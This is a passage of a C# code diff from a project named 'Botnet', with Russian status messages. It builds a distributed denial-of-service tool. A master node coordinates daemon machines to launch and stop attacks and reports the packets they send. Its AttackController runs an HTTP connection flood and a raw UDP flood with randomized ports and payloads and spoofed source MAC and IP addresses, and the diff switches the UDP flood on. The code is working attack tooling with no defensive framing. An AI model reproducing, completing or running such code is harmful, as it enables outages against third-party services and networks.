-                            Master = RemoteIpEndPoint; //possible collisions
-                            mode = false;
-                            state = ControllerState.Suspending;
-                            SendServiceMessage(Master, MessageCode.DaemonHello);
-                        }
-                        ; break;
-                    case (byte)MessageCode.MasterOnAck: //use it when 
-                        mode = true;
-                        state = ControllerState.Master; //provide callback for mode changing
-                        ChangeMode(true);
-                        MasterTuning();
-                        ; break;
-                    case (byte)MessageCode.ElectionRequired:
-                        mode = false;
-                        //Params = UnsetParams;
-                        state = ControllerState.Tuning;
-                        beginElection();
-                        ; break;
-                }
-            }
-        }
-
-        private void beginElection()
-        {
-            IPEndPoint Any = new IPEndPoint(IPAddress.Any, BroadcastPort);
-            byte[] MyMac = NetworkInstruments.GetMacAddress().GetAddressBytes();
-            byte[] tempMac = new byte[6];
-            byte[] data; // message structure == code + 6 byte mac
-            bool MyAddressIsTheBiggest = true;
-            bool Receiving = true;
-            SendServiceMessage(new IPEndPoint(IPAddress.Broadcast, BroadcastPort), MessageCode.ElectionRequired);
-            SendServiceMessage(new IPEndPoint(IPAddress.Broadcast, BroadcastPort), MessageCode.ElectionInfo, MyMac); //timing?
-            while (Receiving)
-            {
-                try
-                {
-                    data = Listener.Receive(ref Any);
-                    switch (data[0])
-                    {
-                        case (byte)MessageCode.ElectionInfo: //what if one will quit during the election? send election reset broadcast
-                            if (MyAddressIsTheBiggest)
-                            {
-                                Array.Copy(data, 1, tempMac, 0, 6);
-                                if (NetworkInstruments.CompareMacs(tempMac, MyMac)) MyAddressIsTheBiggest = false;
-                            }
-                            break;
-                        case (byte)MessageCode.MasterEchoRequest:
-                            SendServiceMessage(Any, MessageCode.ElectionRequired);
-                            break;
-                        case (byte)MessageCode.ElectionReset:
-                            MyAddressIsTheBiggest = true;
-                            SendServiceMessage(new IPEndPoint(IPAddress.Broadcast, BroadcastPort), MessageCode.ElectionRequired);
-                            SendServiceMessage(new IPEndPoint(IPAddress.Broadcast, BroadcastPort), MessageCode.ElectionInfo, MyMac); //timing?
-                            break;
-                        default: break; ;
+                        else UpdateData("Атака еще не запущена мастером");
                     }
 
                 }
-                catch (SocketException)
+                else
                 {
-                    Receiving = false;
-                    throw;
+                    UpdateData("Атака уже запущена");
                 }
-            }
-            if (MyAddressIsTheBiggest)
-            {
-                UpdateData("В ходе выборов текущая машина была выбрана мастером");
-                state = ControllerState.Master;
-                mode = true; //provide callback for mode change
-                ChangeMode(true);
-                MasterTuning();
             }
             else
             {
-                UpdateData("В ходе выборов выбран новый мастер, ожидание мастера...");
-                mode = false;
-                ChangeMode(false);
-                state = ControllerState.Suspending; //oder nie?
-                //Params = UnsetParams;
-                Master = new IPEndPoint(IPAddress.Any, 0);  //maybe create unsetMaster?
+                UpdateData("Отсутсвует подключение к мастеру");  //oder not only to master
+                state = ControllerState.Suspending;
+            }
+
+        }
+
+
+        public void Stop()
+        {
+            if (state == ControllerState.Attacking)
+            {
+                Core.stop();
+                UpdateData("Остановка атаки...");
+                if (mode)
+                {
+                    SendServiceMessage(MessageCode.StopAttack);
+                }
+                state = ControllerState.Suspending;
+            }
+            else
+            {
+                UpdateData("Атака еще не запущена");
             }
         }
 
+        //UpdateData(); // check it
+        private void SendServiceMessage(MessageCode code, params byte[] payload)
+        {
+            List<byte> data = new List<byte>();
+            data.Add((byte)code);
+            if (payload.Length != 0)
+            {
+                data.AddRange(BitConverter.GetBytes((UInt16)payload.Length));
+                data.AddRange(payload);
+            }
+            for (int i = 0; i < Daemons.Count; ++i)
+            {
+                Daemons[i].Client.GetStream().Write(data.ToArray(), 0, data.Count);
+            }
+        }
+
+        private void CoreErrorHandler(int errorcode, string message)  //0 socket error, 1 - cant reach the target
+        {
+            if (state != ControllerState.Suspending)
+            {
+                Stop();
+                //state = ControllerState.Error;
+            }
+            ExErrorHandler(message);
+
+        }
 
         public void Statistic() //return amount of sent packets from each pc
         {
             //return new int[] { };
-            packetcounter = Core.Counter;
+            //packetcounter = Core.Counter;
             if (mode)
             {
-                SendServiceMessage(new IPEndPoint(IPAddress.Broadcast, BroadcastPort), MessageCode.StatisticMessageRequest);
+                if (Daemons.Count != 0)
+                {
+                    SendServiceMessage(MessageCode.StatisticMessageRequest);
+                    ProccessStatisticRespond(Core.HttpCounter, Core.UdpCounter, NetCounter.getTotatHttp(), NetCounter.getTotalUdp());
+                }
+                else
+                {
+                    ProccessStatisticRespond(Core.HttpCounter, Core.UdpCounter, Core.HttpCounter, Core.UdpCounter);
+                }
+                //hehe, what if there's no other devices?
             }
             else
             {
-                StatisticRespond(packetcounter);
+                ProccessStatisticRespond(Core.HttpCounter, Core.UdpCounter, 0, 0);
             }
         }
-        public Daemon[] GetDaemonList()
+        public string[] GetDaemonList()
         {
             if (!mode) throw new Exception(); //if daemon mode its invalid cast
-            return Daemons.ToArray();
+            string[] info = new string[Daemons.Count];
+            for (int i = 0; i < info.Length; ++i)
+            {
+                info[i] = Daemons[i].ToString();
+            }
+            return info;
+            // return for each daemon to array();
+        }
+        public void Close()
+        {
+            //close all connections
+            if (mode)
+            {
+                if (Server != null)
+                {
+                    for (int i = 0; i < Daemons.Count; ++i)
+                    {
+                        Daemons[i].Client.Close();
+                    }
+                    Server.Stop();
+                }
+            }
+            else
+            {
+                if (HostClient != null)
+                {
+                    HostClient.Close();
+                }
+            }
         }
     }
     sealed public class AttackController
@@ -827,11 +685,24 @@ namespace Botnet
         private Random Randomizer = new Random();
         private TcpClient Client;
         private volatile bool Attacking;
+        private volatile int udpCounter;
+        private volatile int httpCounter;
+        private int TryConnectAm;
+        public volatile NetworkInterface Adapter;
         public AttackParams Params;
-
-        private void InitClient(ref TcpClient client)
+        public bool State
         {
-            Client = new TcpClient(new IPEndPoint(NetworkInstruments.getLocaIP(), 0));
+            get
+            {
+                return Attacking;
+            }
+        }
+        public delegate void ErrorCallBack(int errcode, string message);
+        public ErrorCallBack ErrorHandler;         //0 - network problem(cant init socket) 1- target is not avaible
+
+        private void InitClient(ref TcpClient client, NetworkInterface Adapter)
+        {
+            Client = new TcpClient(new IPEndPoint(NetworkInstruments.getAdapterIPAddress(Adapter), 0));
             Client.ReceiveBufferSize = 1514;
         }
         private void processHttpFlood(Object Params)
@@ -843,9 +714,10 @@ namespace Botnet
             {
                 while (Attacking)
                 {
-                    InitClient(ref Client);
+                    InitClient(ref Client, Adapter);
                     Client.SendBufferSize = msg.Length;
                     Client.Connect(_params.Target);
+                    TryConnectAm = 0;
                     NetworkStream TcpStream = Client.GetStream();
                     try
                     {
@@ -858,24 +730,36 @@ namespace Botnet
                             if (TcpStream.CanWrite)
                             {
                                 TcpStream.Write(msg, 0, msg.Length);
+                                httpCounter++;
                             }
                             Thread.Sleep(100);
                         }
                     }
                     catch (System.IO.IOException)
                     { }
-                    catch (SocketException err)
-                    { 
-
-                    }
                 }
                 Client.Close();
             }
             catch (SocketException err)
             {
-                if(err.ErrorCode == (int)SocketError.TimedOut)
+                if (err.ErrorCode == (int)SocketError.TimedOut) // 
                 {
-                    //
+                    Thread.Sleep(4000); // wait a bit, let the bitch have some rest
+                    if (TryConnectAm == 4)
+                    {
+                        Attacking = false;
+                        ErrorHandler(1, "Невозможно подключиться к цели");
+                    }
+                    else
+                    {
+                        TryConnectAm += 1;
+                        processHttpFlood(Params);
+                    }
+                }
+                if (err.ErrorCode == (int)SocketError.AddressNotAvailable)
+                {
+                    Attacking = false;
+                    ErrorHandler(0, "Указанный адрес недопустим");
                 }
             }
 
@@ -888,20 +772,24 @@ namespace Botnet
             if (_params.UdpFloodEnabled)
             {
                 NetworkInstruments.IpRandomizer IpSpoofer = new NetworkInstruments.IpRandomizer();
-                ICaptureDevice Adapter = NetworkInstruments.getActiveDevice();
-                PhysicalAddress TargetMac = NetworkInstruments.ResolveMac((LibPcapLiveDevice)Adapter, _params.Target.Address);
-                Adapter.Open();
+                ICaptureDevice ActiveDevice = NetworkInstruments.getActiveDevice(Adapter.GetPhysicalAddress());
+                PhysicalAddress TargetMac = NetworkInstruments.ResolveMac((LibPcapLiveDevice)ActiveDevice, _params.Target.Address);
+                ActiveDevice.Open();
                 UdpPacket udpPacket = new UdpPacket(0, 80);
-                IPv4Packet ipPacket = new IPv4Packet(IPAddress.Parse("192.168.0.6"), _params.Target.Address);
+                IPv4Packet ipPacket = new IPv4Packet(IPAddress.Any, _params.Target.Address);
                 ipPacket.Protocol = IPProtocolType.UDP;
                 ipPacket.PayloadPacket = udpPacket;
-                EthernetPacket ethernetPacket = new EthernetPacket(NetworkInstruments.GetMacAddress(), TargetMac, EthernetPacketType.None);
+                if (TargetMac == null)
+                {
+                    ErrorHandler(1, "Невозможно получить MAC адрес цели");
+                    return;
+                }; //unable to resolve mac 
+                EthernetPacket ethernetPacket = new EthernetPacket(Adapter.GetPhysicalAddress(), TargetMac, EthernetPacketType.None);
                 ethernetPacket.PayloadPacket = ipPacket;
                 while (Attacking)
                 {
                     udpPacket.SourcePort = (ushort)Randomizer.Next(1, 49160);
                     udpPacket.DestinationPort = (ushort)Randomizer.Next(1, 49160);
-                    //udpPacket.DestinationPort = 80; //mb another ports?
                     udpPacket.PayloadData = new byte[Randomizer.Next(500)];
                     Randomizer.NextBytes(udpPacket.PayloadData);
                     udpPacket.UpdateCalculatedValues();
@@ -912,17 +800,32 @@ namespace Botnet
                     ethernetPacket.SourceHwAddress = NetworkInstruments.GetRandomMac(ref Randomizer);
                     ethernetPacket.UpdateCalculatedValues();
                     udpPacket.UpdateUDPChecksum();
-                    Adapter.SendPacket(ethernetPacket);
+                    ActiveDevice.SendPacket(ethernetPacket);
+                    udpCounter++;
                 }
             }
         }
-        public int Counter { get; private set; } //perpahs use counter of sent packets?
-        public bool State { get; private set; } // true - attacking
-        public AttackController(AttackParams Params)
+        public int HttpCounter
+        {
+            get
+            {
+                return httpCounter;
+            }
+        } //perpahs use counter of sent packets?
+        public int UdpCounter
+        {
+            get
+            {
+                return udpCounter;
+            }
+        }
+        public AttackController(AttackParams Params, NetworkInterface Adapter, ErrorCallBack Errorhandler)
         {
             this.Params = Params;
+            this.Adapter = Adapter;
             HttpGenerator = new Thread(new ParameterizedThreadStart(processHttpFlood));
             UdpGenerator = new Thread(new ParameterizedThreadStart(processUdpFlood));
+            this.ErrorHandler = Errorhandler;
             Attacking = false;
         }
         public void start()
@@ -936,14 +839,14 @@ namespace Botnet
             {
                 HttpGenerator.Start(Params);
             }
-            //if (UdpGenerator.ThreadState == ThreadState.Stopped)
-            //{
-            //    UdpGenerator = new Thread(new ParameterizedThreadStart(processUdpFlood));
-            //}
-            //if (UdpGenerator.ThreadState == ThreadState.Unstarted) //do we need it?
-            //{
-            //    UdpGenerator.Start(Params);
-            //}
+            if (UdpGenerator.ThreadState == ThreadState.Stopped)
+            {
+                UdpGenerator = new Thread(new ParameterizedThreadStart(processUdpFlood));
+            }
+            if (UdpGenerator.ThreadState == ThreadState.Unstarted) //do we need it?
+            {
+                UdpGenerator.Start(Params);
+            }
         }
         //private TcpPacket Connect(Address Target, ushort port)
         //{
